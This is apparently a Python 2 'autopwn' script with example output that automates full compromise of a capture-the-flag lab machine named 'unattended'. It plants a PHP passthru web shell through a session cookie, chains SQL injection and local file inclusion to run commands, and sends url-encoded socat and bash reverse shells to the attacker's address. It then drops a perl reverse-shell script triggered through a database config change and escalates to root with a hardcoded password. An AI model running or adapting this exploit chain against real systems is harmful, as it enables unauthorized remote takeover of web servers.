</span></span><span class="line"><span class="cl"><span class="kn">import</span> <span class="nn">uuid</span>
</span></span><span class="line"><span class="cl"><span class="kn">import</span> <span class="nn">fcntl</span>
</span></span><span class="line"><span class="cl"><span class="kn">import</span> <span class="nn">base64</span>
</span></span><span class="line"><span class="cl"><span class="kn">import</span> <span class="nn">urllib</span>
</span></span><span class="line"><span class="cl"><span class="kn">import</span> <span class="nn">random</span>
</span></span><span class="line"><span class="cl"><span class="kn">import</span> <span class="nn">requests</span>
</span></span><span class="line"><span class="cl"><span class="n">requests</span><span class="o">.</span><span class="n">packages</span><span class="o">.</span><span class="n">urllib3</span><span class="o">.</span><span class="n">disable_warnings</span><span class="p">()</span>
</span></span><span class="line"><span class="cl"><span class="kn">import</span> <span class="nn">signal</span>
</span></span><span class="line"><span class="cl"><span class="n">signal</span><span class="o">.</span><span class="n">signal</span><span class="p">(</span><span class="n">signal</span><span class="o">.</span><span class="n">SIGINT</span><span class="p">,</span> <span class="n">signal</span><span class="o">.</span><span class="n">SIG_DFL</span><span class="p">)</span>
</span></span><span class="line"><span class="cl"><span class="kn">from</span> <span class="nn">pwn</span> <span class="kn">import</span> <span class="o">*</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl"><span class="k">def</span> <span class="nf">int2ipv6</span><span class="p">(</span><span class="n">addr</span><span class="p">):</span>
</span></span><span class="line"><span class="cl">    <span class="s1">&#39;&#39;&#39; Convert an integer to an IPv6 address &#39;&#39;&#39;</span>
</span></span><span class="line"><span class="cl">    <span class="n">addr</span> <span class="o">=</span> <span class="n">addr</span><span class="o">.</span><span class="n">decode</span><span class="p">(</span><span class="s1">&#39;hex&#39;</span><span class="p">)</span>
</span></span><span class="line"><span class="cl">    <span class="n">addr</span> <span class="o">=</span> <span class="n">socket</span><span class="o">.</span><span class="n">inet_ntop</span><span class="p">(</span><span class="n">socket</span><span class="o">.</span><span class="n">AF_INET6</span><span class="p">,</span> <span class="n">addr</span><span class="p">)</span>
</span></span><span class="line"><span class="cl">    <span class="k">return</span> <span class="n">addr</span>
</span></span><span class="line"><span class="cl">    
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl"><span class="k">def</span> <span class="nf">get_ip_address</span><span class="p">(</span><span class="n">ifname</span><span class="p">,</span> <span class="n">ipv6</span><span class="o">=</span><span class="kc">False</span><span class="p">):</span>
</span></span><span class="line"><span class="cl">    <span class="s1">&#39;&#39;&#39; Return the IP of an interface. &#39;&#39;&#39;</span>
</span></span><span class="line"><span class="cl">    <span class="k">if</span> <span class="n">ipv6</span><span class="p">:</span>
</span></span><span class="line"><span class="cl">        <span class="k">with</span> <span class="nb">open</span><span class="p">(</span><span class="s2">&#34;/proc/net/if_inet6&#34;</span> <span class="p">,</span> <span class="s2">&#34;rt&#34;</span><span class="p">)</span> <span class="k">as</span> <span class="n">f</span><span class="p">:</span>
</span></span><span class="line"><span class="cl">            <span class="n">lines</span> <span class="o">=</span> <span class="n">f</span><span class="o">.</span><span class="n">readlines</span><span class="p">()</span>
</span></span><span class="line"><span class="cl">        <span class="k">for</span> <span class="n">line</span> <span class="ow">in</span> <span class="n">lines</span><span class="p">:</span>
</span></span><span class="line"><span class="cl">            <span class="n">data</span> <span class="o">=</span> <span class="n">line</span><span class="o">.</span><span class="n">split</span><span class="p">()</span>
</span></span><span class="line"><span class="cl">            <span class="n">address</span> <span class="o">=</span> <span class="n">data</span><span class="p">[</span><span class="mi">0</span><span class="p">]</span><span class="o">.</span><span class="n">strip</span><span class="p">()</span>
</span></span><span class="line"><span class="cl">            <span class="n">interface</span> <span class="o">=</span> <span class="n">data</span><span class="p">[</span><span class="mi">5</span><span class="p">]</span><span class="o">.</span><span class="n">strip</span><span class="p">()</span>
</span></span><span class="line"><span class="cl">            <span class="k">if</span> <span class="n">interface</span> <span class="o">==</span> <span class="n">ifname</span> <span class="ow">and</span> <span class="n">address</span><span class="p">[</span><span class="mi">0</span><span class="p">:</span><span class="mi">4</span><span class="p">]</span> <span class="ow">not</span> <span class="ow">in</span> <span class="p">[</span><span class="s2">&#34;fe80&#34;</span><span class="p">,</span> <span class="s2">&#34;fd00&#34;</span><span class="p">]:</span>
</span></span><span class="line"><span class="cl">                <span class="k">return</span> <span class="n">int2ipv6</span><span class="p">(</span><span class="n">address</span><span class="p">)</span>
</span></span><span class="line"><span class="cl">    <span class="k">else</span><span class="p">:</span>
</span></span><span class="line"><span class="cl">        <span class="n">s</span> <span class="o">=</span> <span class="n">socket</span><span class="o">.</span><span class="n">socket</span><span class="p">(</span><span class="n">socket</span><span class="o">.</span><span class="n">AF_INET</span><span class="p">,</span> <span class="n">socket</span><span class="o">.</span><span class="n">SOCK_DGRAM</span><span class="p">)</span>
</span></span><span class="line"><span class="cl">        <span class="k">return</span> <span class="n">socket</span><span class="o">.</span><span class="n">inet_ntoa</span><span class="p">(</span><span class="n">fcntl</span><span class="o">.</span><span class="n">ioctl</span><span class="p">(</span><span class="n">s</span><span class="o">.</span><span class="n">fileno</span><span class="p">(),</span>
</span></span><span class="line"><span class="cl">                                <span class="mh">0x8915</span><span class="p">,</span>  <span class="c1"># SIOCGIFADDR</span>
</span></span><span class="line"><span class="cl">                                <span class="n">struct</span><span class="o">.</span><span class="n">pack</span><span class="p">(</span><span class="s1">&#39;256s&#39;</span><span class="p">,</span> <span class="n">ifname</span><span class="p">[:</span><span class="mi">15</span><span class="p">]</span><span class="o">.</span><span class="n">encode</span><span class="p">()))[</span><span class="mi">20</span><span class="p">:</span><span class="mi">24</span><span class="p">])</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl"><span class="n">IPV6</span> <span class="o">=</span> <span class="kc">True</span>
</span></span><span class="line"><span class="cl"><span class="n">INTERFACE</span> <span class="o">=</span> <span class="s2">&#34;tun0&#34;</span>
</span></span><span class="line"><span class="cl"><span class="n">LHOST</span> <span class="o">=</span> <span class="n">get_ip_address</span><span class="p">(</span><span class="n">INTERFACE</span><span class="p">,</span> <span class="n">ipv6</span><span class="o">=</span><span class="n">IPV6</span><span class="p">)</span>
</span></span><span class="line"><span class="cl"><span class="k">if</span> <span class="n">IPV6</span><span class="p">:</span>
</span></span><span class="line"><span class="cl">    <span class="n">LPORT1</span> <span class="o">=</span> <span class="s2">&#34;60000&#34;</span>
</span></span><span class="line"><span class="cl">    <span class="n">LPORT2</span> <span class="o">=</span> <span class="s2">&#34;60001&#34;</span>
</span></span><span class="line"><span class="cl"><span class="k">else</span><span class="p">:</span>
</span></span><span class="line"><span class="cl">    <span class="n">LPORT1</span> <span class="o">=</span> <span class="s2">&#34;443&#34;</span>
</span></span><span class="line"><span class="cl">    <span class="n">LPORT2</span> <span class="o">=</span> <span class="s2">&#34;80&#34;</span>
</span></span><span class="line"><span class="cl"><span class="n">RURL</span> <span class="o">=</span> <span class="s2">&#34;https://www.nestedflanders.htb&#34;</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl"><span class="k">def</span> <span class="nf">send_payload</span><span class="p">():</span>
</span></span><span class="line"><span class="cl">    <span class="k">try</span><span class="p">:</span>
</span></span><span class="line"><span class="cl">        <span class="n">session</span> <span class="o">=</span> <span class="n">requests</span><span class="o">.</span><span class="n">Session</span><span class="p">()</span>
</span></span><span class="line"><span class="cl">        <span class="n">session</span><span class="o">.</span><span class="n">verify</span> <span class="o">=</span> <span class="kc">False</span>
</span></span><span class="line"><span class="cl">        <span class="n">session</span><span class="o">.</span><span class="n">cookies</span><span class="p">[</span><span class="s1">&#39;user_name&#39;</span><span class="p">]</span> <span class="o">=</span> <span class="s1">&#39;&lt;?php passthru($_REQUEST[cmd])?&gt;&#39;</span>
</span></span><span class="line"><span class="cl">        <span class="n">response</span> <span class="o">=</span> <span class="n">session</span><span class="o">.</span><span class="n">get</span><span class="p">(</span><span class="n">RURL</span> <span class="o">+</span> <span class="s2">&#34;/index.php&#34;</span><span class="p">)</span>
</span></span><span class="line"><span class="cl">        <span class="n">log</span><span class="o">.</span><span class="n">info</span><span class="p">(</span><span class="s2">&#34;Injecting session via cookies: Status code &#34;</span> <span class="o">+</span> <span class="nb">str</span><span class="p">(</span><span class="n">response</span><span class="o">.</span><span class="n">status_code</span><span class="p">))</span>
</span></span><span class="line"><span class="cl">        <span class="k">if</span> <span class="n">response</span><span class="o">.</span><span class="n">status_code</span> <span class="o">!=</span> <span class="mi">200</span><span class="p">:</span>
</span></span><span class="line"><span class="cl">            <span class="n">exit</span><span class="p">()</span>
</span></span><span class="line"><span class="cl">        <span class="n">log</span><span class="o">.</span><span class="n">info</span><span class="p">(</span><span class="s2">&#34;Cookies: &#34;</span> <span class="o">+</span> <span class="nb">str</span><span class="p">(</span><span class="n">session</span><span class="o">.</span><span class="n">cookies</span><span class="o">.</span><span class="n">get_dict</span><span class="p">()))</span>
</span></span><span class="line"><span class="cl">        <span class="n">phpsessid</span> <span class="o">=</span> <span class="n">session</span><span class="o">.</span><span class="n">cookies</span><span class="o">.</span><span class="n">get_dict</span><span class="p">()[</span><span class="s2">&#34;PHPSESSID&#34;</span><span class="p">]</span><span class="o">.</span><span class="n">strip</span><span class="p">()</span>
</span></span><span class="line"><span class="cl">        <span class="k">if</span> <span class="ow">not</span> <span class="n">phpsessid</span><span class="p">:</span>
</span></span><span class="line"><span class="cl">            <span class="n">exit</span><span class="p">()</span>
</span></span><span class="line"><span class="cl">        <span class="n">response</span> <span class="o">=</span> <span class="n">session</span><span class="o">.</span><span class="n">get</span><span class="p">(</span><span class="n">RURL</span> <span class="o">+</span> <span class="s2">&#34;/index.php?id=587</span><span class="si">%27%</span><span class="s2">20UNION%20SELECT</span><span class="si">%20%</span><span class="s2">22about</span><span class="si">%27%</span><span class="s2">20UNION%20SELECT</span><span class="si">%20%</span><span class="s2">27</span><span class="si">%2f</span><span class="s2">var</span><span class="si">%2f</span><span class="s2">lib</span><span class="si">%2f</span><span class="s2">php</span><span class="si">%2f</span><span class="s2">sessions</span><span class="si">%2f</span><span class="s2">sess_&#34;</span> <span class="o">+</span> <span class="n">phpsessid</span> <span class="o">+</span> <span class="s2">&#34;</span><span class="si">%27%</span><span class="s2">20LIMIT%201,1%20--</span><span class="si">%20%</span><span class="s2">22%20LIMIT%201,1%20--%20&amp;cmd=whoami&#34;</span><span class="p">)</span>
</span></span><span class="line"><span class="cl">        <span class="n">log</span><span class="o">.</span><span class="n">info</span><span class="p">(</span><span class="s2">&#34;LFI via SQLI status code: &#34;</span> <span class="o">+</span> <span class="nb">str</span><span class="p">(</span><span class="n">response</span><span class="o">.</span><span class="n">status_code</span><span class="p">))</span>
</span></span><span class="line"><span class="cl">        <span class="k">if</span> <span class="n">response</span><span class="o">.</span><span class="n">status_code</span> <span class="o">!=</span> <span class="mi">200</span><span class="p">:</span>
</span></span><span class="line"><span class="cl">            <span class="n">exit</span><span class="p">()</span>
</span></span><span class="line"><span class="cl">        <span class="k">if</span> <span class="s2">&#34;www-data&#34;</span> <span class="ow">in</span> <span class="n">response</span><span class="o">.</span><span class="n">content</span><span class="p">:</span>
</span></span><span class="line"><span class="cl">            <span class="n">log</span><span class="o">.</span><span class="n">success</span><span class="p">(</span><span class="s2">&#34;Testing RCE: SUCCESS&#34;</span><span class="p">)</span>
</span></span><span class="line"><span class="cl">        <span class="k">else</span><span class="p">:</span>
</span></span><span class="line"><span class="cl">            <span class="n">log</span><span class="o">.</span><span class="n">error</span><span class="p">(</span><span class="s2">&#34;Testing RCE: FAILED&#34;</span><span class="p">)</span>
</span></span><span class="line"><span class="cl">            <span class="n">exit</span><span class="p">()</span>
</span></span><span class="line"><span class="cl">            
</span></span><span class="line"><span class="cl">        <span class="c1"># Alternative payloads (they work too)</span>
</span></span><span class="line"><span class="cl">        <span class="c1"># Payload (url-encoded): bash -c &#39;bash -i &gt;&amp; /dev/tcp/LHOST/LPORT1 0&gt;&amp;1&#39; </span>
</span></span><span class="line"><span class="cl">        <span class="c1"># payload = &#34;%62%61%73%68%20%2d%63%20%27%62%61%73%68%20%2d%69%20%3e%26%20%2f%64%65%76%2f%74%63%70%2f&#34; + LHOST + &#34;%2f&#34; + str(LPORT1) + &#34;%20%30%3e%26%31%27&#34;</span>
</span></span><span class="line"><span class="cl">        
</span></span><span class="line"><span class="cl">        <span class="k">if</span> <span class="n">IPV6</span><span class="p">:</span>
</span></span><span class="line"><span class="cl">            <span class="c1"># Payload (url-encoded): socat exec:&#39;bash -li&#39;,pty,stderr,setsid,sigint,sane tcp6:[LHOST]:LPORT1</span>
</span></span><span class="line"><span class="cl">            <span class="n">payload</span> <span class="o">=</span> <span class="s2">&#34;</span><span class="si">%73%</span><span class="s2">6f</span><span class="si">%63%</span><span class="s2">61</span><span class="si">%74%</span><span class="s2">20</span><span class="si">%65%</span><span class="s2">78</span><span class="si">%65%</span><span class="s2">63</span><span class="si">%3a%27%</span><span class="s2">62</span><span class="si">%61%</span><span class="s2">73</span><span class="si">%68%</span><span class="s2">20</span><span class="si">%2d%6c%69%</span><span class="s2">27</span><span class="si">%2c%70%</span><span class="s2">74</span><span class="si">%79%</span><span class="s2">2c</span><span class="si">%73%</span><span class="s2">74</span><span class="si">%64%</span><span class="s2">65</span><span class="si">%72%</span><span class="s2">72</span><span class="si">%2c%73%</span><span class="s2">65</span><span class="si">%74%</span><span class="s2">73</span><span class="si">%69%</span><span class="s2">64</span><span class="si">%2c%73%</span><span class="s2">69</span><span class="si">%67%</span><span class="s2">69</span><span class="si">%6e%74%</span><span class="s2">2c</span><span class="si">%73%</span><span class="s2">61</span><span class="si">%6e%65%</span><span class="s2">20</span><span class="si">%74%</span><span class="s2">63</span><span class="si">%706%</span><span class="s2">3a%5b&#34;</span> <span class="o">+</span> <span class="n">LHOST</span> <span class="o">+</span> <span class="s2">&#34;</span><span class="si">%5d%3a</span><span class="s2">&#34;</span> <span class="o">+</span> <span class="nb">str</span><span class="p">(</span><span class="n">LPORT1</span><span class="p">)</span>
</span></span><span class="line"><span class="cl">        <span class="k">else</span><span class="p">:</span>
</span></span><span class="line"><span class="cl">            <span class="c1"># Payload (url-encoded): socat exec:&#39;bash -li&#39;,pty,stderr,setsid,sigint,sane tcp:LHOST:LPORT1</span>
</span></span><span class="line"><span class="cl">            <span class="n">payload</span> <span class="o">=</span> <span class="s2">&#34;</span><span class="si">%73%</span><span class="s2">6f</span><span class="si">%63%</span><span class="s2">61</span><span class="si">%74%</span><span class="s2">20</span><span class="si">%65%</span><span class="s2">78</span><span class="si">%65%</span><span class="s2">63</span><span class="si">%3a%27%</span><span class="s2">62</span><span class="si">%61%</span><span class="s2">73</span><span class="si">%68%</span><span class="s2">20</span><span class="si">%2d%6c%69%</span><span class="s2">27</span><span class="si">%2c%70%</span><span class="s2">74</span><span class="si">%79%</span><span class="s2">2c</span><span class="si">%73%</span><span class="s2">74</span><span class="si">%64%</span><span class="s2">65</span><span class="si">%72%</span><span class="s2">72</span><span class="si">%2c%73%</span><span class="s2">65</span><span class="si">%74%</span><span class="s2">73</span><span class="si">%69%</span><span class="s2">64</span><span class="si">%2c%73%</span><span class="s2">69</span><span class="si">%67%</span><span class="s2">69</span><span class="si">%6e%74%</span><span class="s2">2c</span><span class="si">%73%</span><span class="s2">61</span><span class="si">%6e%65%</span><span class="s2">20</span><span class="si">%74%</span><span class="s2">63</span><span class="si">%70%</span><span class="s2">3a&#34;</span> <span class="o">+</span> <span class="n">LHOST</span> <span class="o">+</span> <span class="s2">&#34;</span><span class="si">%3a</span><span class="s2">&#34;</span> <span class="o">+</span> <span class="nb">str</span><span class="p">(</span><span class="n">LPORT1</span><span class="p">)</span>
</span></span><span class="line"><span class="cl">            
</span></span><span class="line"><span class="cl">        <span class="n">response</span> <span class="o">=</span> <span class="n">session</span><span class="o">.</span><span class="n">get</span><span class="p">(</span><span class="n">RURL</span> <span class="o">+</span> <span class="s2">&#34;/index.php?id=587</span><span class="si">%27%</span><span class="s2">20UNION%20SELECT</span><span class="si">%20%</span><span class="s2">22about</span><span class="si">%27%</span><span class="s2">20UNION%20SELECT</span><span class="si">%20%</span><span class="s2">27</span><span class="si">%2f</span><span class="s2">var</span><span class="si">%2f</span><span class="s2">lib</span><span class="si">%2f</span><span class="s2">php</span><span class="si">%2f</span><span class="s2">sessions</span><span class="si">%2f</span><span class="s2">sess_&#34;</span> <span class="o">+</span> <span class="n">phpsessid</span> <span class="o">+</span> <span class="s2">&#34;</span><span class="si">%27%</span><span class="s2">20LIMIT%201,1%20--</span><span class="si">%20%</span><span class="s2">22%20LIMIT%201,1%20--%20&amp;cmd=&#34;</span> <span class="o">+</span> <span class="n">payload</span><span class="p">)</span>
</span></span><span class="line"><span class="cl">    <span class="k">except</span> <span class="n">requests</span><span class="o">.</span><span class="n">exceptions</span><span class="o">.</span><span class="n">RequestException</span> <span class="k">as</span> <span class="n">e</span><span class="p">:</span>
</span></span><span class="line"><span class="cl">        <span class="n">log</span><span class="o">.</span><span class="n">failure</span><span class="p">(</span><span class="nb">str</span><span class="p">(</span><span class="n">e</span><span class="p">))</span>
</span></span><span class="line"><span class="cl">    <span class="k">finally</span><span class="p">:</span>
</span></span><span class="line"><span class="cl">        <span class="k">if</span> <span class="n">session</span><span class="p">:</span>
</span></span><span class="line"><span class="cl">            <span class="n">session</span><span class="o">.</span><span class="n">close</span><span class="p">()</span>
</span></span><span class="line"><span class="cl">        <span class="n">log</span><span class="o">.</span><span class="n">success</span><span class="p">(</span><span class="s2">&#34;Web session thread exited successfully.&#34;</span><span class="p">)</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl"><span class="n">log</span><span class="o">.</span><span class="n">info</span><span class="p">(</span><span class="s2">&#34;LHOST: &#34;</span> <span class="o">+</span> <span class="n">LHOST</span><span class="p">)</span>
</span></span><span class="line"><span class="cl"><span class="nb">print</span><span class="p">(</span><span class="s2">&#34;</span><span class="se">\n</span><span class="s2">What shell do you want?&#34;</span><span class="p">)</span>
</span></span><span class="line"><span class="cl"><span class="nb">print</span><span class="p">(</span><span class="s2">&#34;[1] www-data@unattended&#34;</span><span class="p">)</span>
</span></span><span class="line"><span class="cl"><span class="nb">print</span><span class="p">(</span><span class="s2">&#34;[2] guly@unattended&#34;</span><span class="p">)</span>
</span></span><span class="line"><span class="cl"><span class="nb">print</span><span class="p">(</span><span class="s2">&#34;[3] root@unattended&#34;</span><span class="p">)</span>
</span></span><span class="line"><span class="cl"><span class="nb">print</span><span class="p">(</span><span class="s2">&#34;[4] Exit</span><span class="se">\n</span><span class="s2">&#34;</span><span class="p">)</span>
</span></span><span class="line"><span class="cl"><span class="n">response</span> <span class="o">=</span> <span class="kc">None</span>
</span></span><span class="line"><span class="cl"><span class="k">while</span> <span class="n">response</span> <span class="ow">not</span> <span class="ow">in</span> <span class="p">[</span><span class="s2">&#34;1&#34;</span><span class="p">,</span> <span class="s2">&#34;2&#34;</span><span class="p">,</span> <span class="s2">&#34;3&#34;</span><span class="p">,</span> <span class="s2">&#34;4&#34;</span><span class="p">]:</span>
</span></span><span class="line"><span class="cl">    <span class="n">response</span> <span class="o">=</span> <span class="n">raw_input</span><span class="p">(</span><span class="s2">&#34;Please enter a number 1-4: &#34;</span><span class="p">)</span><span class="o">.</span><span class="n">strip</span><span class="p">()</span>
</span></span><span class="line"><span class="cl"><span class="k">if</span> <span class="n">response</span> <span class="o">==</span> <span class="s2">&#34;4&#34;</span><span class="p">:</span>
</span></span><span class="line"><span class="cl">    <span class="n">sys</span><span class="o">.</span><span class="n">exit</span><span class="p">()</span>
</span></span><span class="line"><span class="cl">    
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl"><span class="k">try</span><span class="p">:</span>
</span></span><span class="line"><span class="cl">    <span class="n">threading</span><span class="o">.</span><span class="n">Thread</span><span class="p">(</span><span class="n">target</span><span class="o">=</span><span class="n">send_payload</span><span class="p">)</span><span class="o">.</span><span class="n">start</span><span class="p">()</span>
</span></span><span class="line"><span class="cl"><span class="k">except</span> <span class="ne">Exception</span> <span class="k">as</span> <span class="n">e</span><span class="p">:</span>
</span></span><span class="line"><span class="cl">    <span class="n">log</span><span class="o">.</span><span class="n">error</span><span class="p">(</span><span class="nb">str</span><span class="p">(</span><span class="n">e</span><span class="p">))</span>
</span></span><span class="line"><span class="cl"><span class="n">wwwdata_shell</span> <span class="o">=</span> <span class="n">listen</span><span class="p">(</span><span class="n">LPORT1</span><span class="p">,</span> <span class="n">bindaddr</span><span class="o">=</span><span class="n">LHOST</span><span class="p">,</span> <span class="n">timeout</span><span class="o">=</span><span class="mi">20</span><span class="p">)</span><span class="o">.</span><span class="n">wait_for_connection</span><span class="p">()</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl"><span class="k">if</span> <span class="n">response</span> <span class="o">==</span> <span class="s2">&#34;1&#34;</span><span class="p">:</span>
</span></span><span class="line"><span class="cl">    <span class="n">wwwdata_shell</span><span class="o">.</span><span class="n">interactive</span><span class="p">()</span>
</span></span><span class="line"><span class="cl">    <span class="n">wwwdata_shell</span><span class="o">.</span><span class="n">exit</span><span class="p">()</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl"><span class="n">log</span><span class="o">.</span><span class="n">info</span><span class="p">(</span><span class="s2">&#34;Writing perl script: /var/lib/php/sessions/a/checkrelease.pl&#34;</span><span class="p">)</span>
</span></span><span class="line"><span class="cl"><span class="n">wwwdata_shell</span><span class="o">.</span><span class="n">sendline</span><span class="p">(</span><span class="s2">&#34;mkdir /var/lib/php/sessions/a&#34;</span><span class="p">)</span>
</span></span><span class="line"><span class="cl"><span class="c1"># wwwdata_shell.sendline(&#39;printf \&#39;#!/usr/bin/perl\nuse Socket;$i=&#34;&#39; + LHOST + &#39;&#34;;$p=&#39; + str(LPORT2) + &#39;;socket(S,PF_INET,SOCK_STREAM,getprotobyname(&#34;tcp&#34;));if(connect(S,sockaddr_in($p,inet_aton($i)))){open(STDIN,&#34;&gt;&amp;S&#34;);open(STDOUT,&#34;&gt;&amp;S&#34;);open(STDERR,&#34;&gt;&amp;S&#34;);exec(&#34;/bin/sh -i&#34;);};\n\&#39; &gt; /var/lib/php/sessions/a/checkrelease.pl&#39;)</span>
</span></span><span class="line"><span class="cl"><span class="k">if</span> <span class="n">IPV6</span><span class="p">:</span>
</span></span><span class="line"><span class="cl">    <span class="n">wwwdata_shell</span><span class="o">.</span><span class="n">sendline</span><span class="p">(</span><span class="s2">&#34;printf &#39;#!/usr/bin/perl</span><span class="se">\n</span><span class="s2">exec(</span><span class="se">\&#34;</span><span class="s2">/usr/bin/socat exec:bash,pty,stderr,setsid,sigint,sane tcp6:[&#34;</span> <span class="o">+</span> <span class="n">LHOST</span> <span class="o">+</span> <span class="s2">&#34;]:&#34;</span> <span class="o">+</span> <span class="nb">str</span><span class="p">(</span><span class="n">LPORT2</span><span class="p">)</span> <span class="o">+</span> <span class="s2">&#34;</span><span class="se">\&#34;</span><span class="s2">);</span><span class="se">\n</span><span class="s2">&#39; &gt; /var/lib/php/sessions/a/checkrelease.pl&#34;</span><span class="p">)</span>
</span></span><span class="line"><span class="cl"><span class="k">else</span><span class="p">:</span>
</span></span><span class="line"><span class="cl">    <span class="n">wwwdata_shell</span><span class="o">.</span><span class="n">sendline</span><span class="p">(</span><span class="s2">&#34;printf &#39;#!/usr/bin/perl</span><span class="se">\n</span><span class="s2">exec(</span><span class="se">\&#34;</span><span class="s2">/usr/bin/socat exec:bash,pty,stderr,setsid,sigint,sane tcp:&#34;</span> <span class="o">+</span> <span class="n">LHOST</span> <span class="o">+</span> <span class="s2">&#34;:&#34;</span> <span class="o">+</span> <span class="nb">str</span><span class="p">(</span><span class="n">LPORT2</span><span class="p">)</span> <span class="o">+</span> <span class="s2">&#34;</span><span class="se">\&#34;</span><span class="s2">);</span><span class="se">\n</span><span class="s2">&#39; &gt; /var/lib/php/sessions/a/checkrelease.pl&#34;</span><span class="p">)</span>
</span></span><span class="line"><span class="cl"><span class="n">log</span><span class="o">.</span><span class="n">info</span><span class="p">(</span><span class="s2">&#34;Making script executable...&#34;</span><span class="p">)</span>
</span></span><span class="line"><span class="cl"><span class="n">wwwdata_shell</span><span class="o">.</span><span class="n">sendline</span><span class="p">(</span><span class="s2">&#34;chmod +x /var/lib/php/sessions/a/checkrelease.pl&#34;</span><span class="p">)</span>
</span></span><span class="line"><span class="cl"><span class="n">log</span><span class="o">.</span><span class="n">info</span><span class="p">(</span><span class="s2">&#34;Modifying db in order to execute our perl script... Now, please wait for a minute...&#34;</span><span class="p">)</span>
</span></span><span class="line"><span class="cl"><span class="n">wwwdata_shell</span><span class="o">.</span><span class="n">sendline</span><span class="p">(</span><span class="s2">&#34;mysql -u nestedflanders -p&#39;1036913cf7d38d4ea4f79b050f171e9fbf3f5e&#39; -e &#39;update config set option_value=</span><span class="se">\&#34;</span><span class="s2">/var/lib/php/sessions/a/checkrelease.pl;</span><span class="se">\&#34;</span><span class="s2"> where option_name=</span><span class="se">\&#34;</span><span class="s2">checkrelease</span><span class="se">\&#34;</span><span class="s2">&#39; neddy;&#34;</span><span class="p">)</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl"><span class="n">guly_shell</span> <span class="o">=</span> <span class="n">listen</span><span class="p">(</span><span class="n">LPORT2</span><span class="p">,</span> <span class="n">bindaddr</span><span class="o">=</span><span class="n">LHOST</span><span class="p">,</span> <span class="n">timeout</span><span class="o">=</span><span class="mi">20</span><span class="p">)</span><span class="o">.</span><span class="n">wait_for_connection</span><span class="p">()</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl"><span class="k">if</span> <span class="n">response</span> <span class="o">==</span> <span class="s2">&#34;2&#34;</span><span class="p">:</span>
</span></span><span class="line"><span class="cl">    <span class="n">guly_shell</span><span class="o">.</span><span class="n">interactive</span><span class="p">()</span>
</span></span><span class="line"><span class="cl">    <span class="n">guly_shell</span><span class="o">.</span><span class="n">exit</span><span class="p">()</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl"><span class="k">if</span> <span class="n">response</span> <span class="o">==</span> <span class="s2">&#34;3&#34;</span><span class="p">:</span>
</span></span><span class="line"><span class="cl">    <span class="n">guly_shell</span><span class="o">.</span><span class="n">sendline</span><span class="p">(</span><span class="s2">&#34;su - root&#34;</span><span class="p">)</span>
</span></span><span class="line"><span class="cl">    <span class="n">guly_shell</span><span class="o">.</span><span class="n">recvuntil</span><span class="p">(</span><span class="s2">&#34;Password:&#34;</span><span class="p">)</span>
</span></span><span class="line"><span class="cl">    <span class="n">guly_shell</span><span class="o">.</span><span class="n">sendline</span><span class="p">(</span><span class="s2">&#34;132f93ab100671dcb263acaf5dc95d8260e8b7c6&#34;</span><span class="p">)</span>
</span></span><span class="line"><span class="cl">    <span class="n">guly_shell</span><span class="o">.</span><span class="n">interactive</span><span class="p">()</span>
</span></span><span class="line"><span class="cl">    <span class="n">guly_shell</span><span class="o">.</span><span class="n">exit</span><span class="p">()</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl"><span class="s1">&#39;&#39;&#39;
</span></span></span><span class="line"><span class="cl"><span class="s1">EXAMPLE OUTPUT:
</span></span></span><span class="line"><span class="cl"><span class="s1">$ python2 autopwn_unattended.py 
</span></span></span><span class="line"><span class="cl"><span class="s1">[*] LHOST: dead:beef:2::12d0
</span></span></span><span class="line"><span class="cl"><span class="s1">
</span></span></span><span class="line"><span class="cl"><span class="s1">What shell do you want?
</span></span></span><span class="line"><span class="cl"><span class="s1">[1] www-data@unattended
</span></span></span><span class="line"><span class="cl"><span class="s1">[2] guly@unattended
</span></span></span><span class="line"><span class="cl"><span class="s1">[3] root@unattended
</span></span></span><span class="line"><span class="cl"><span class="s1">[4] Exit
</span></span></span><span class="line"><span class="cl"><span class="s1">
</span></span></span><span class="line"><span class="cl"><span class="s1">Please enter a number 1-4: 3
</span></span></span><span class="line"><span class="cl"><span class="s1">[+] Trying to bind to dead:beef:2::12d0 on port 60000: Done
</span></span></span><span class="line"><span class="cl"><span class="s1">[+] Waiting for connections on dead:beef:2::12d0:60000: Got connection from dead:beef::250:56ff:feb9:880a on port 56102
</span></span></span><span class="line"><span class="cl"><span class="s1">[*] Injecting session via cookies: Status code 200
</span></span></span><span class="line"><span class="cl"><span class="s1">[*] Cookies: {&#39;PHPSESSID&#39;: &#39;te3d32j80hdvrp8a63luu1cmk3&#39;, &#39;user_name&#39;: &#39;&lt;?php passthru($_REQUEST[cmd])?&gt;&#39;}
</span></span></span><span class="line"><span class="cl"><span class="s1">[*] LFI via SQLI status code: 200
</span></span></span><span class="line"><span class="cl"><span class="s1">[+] Testing RCE: SUCCESS
</span></span></span><span class="line"><span class="cl"><span class="s1">[*] Writing perl script: /var/lib/php/sessions/a/checkrelease.pl
</span></span></span><span class="line"><span class="cl"><span class="s1">[*] Making script executable...
</span></span></span><span class="line"><span class="cl"><span class="s1">[*] Modifying db in order to execute our perl script... Now, please wait for a minute...
</span></span></span><span class="line"><span class="cl"><span class="s1">[+] Trying to bind to dead:beef:2::12d0 on port 60001: Done
</span></span></span><span class="line"><span class="cl"><span class="s1">[+] Waiting for connections on dead:beef:2::12d0:60001: Got connection from dead:beef::250:56ff:feb9:880a on port 53594
</span></span></span><span class="line"><span class="cl"><span class="s1">[*] Switching to interactive mode
</span></span></span><span class="line"><span class="cl"><span class="s1"> 
</span></span></span><span class="line"><span class="cl"><span class="s1">root@unattended:~# $
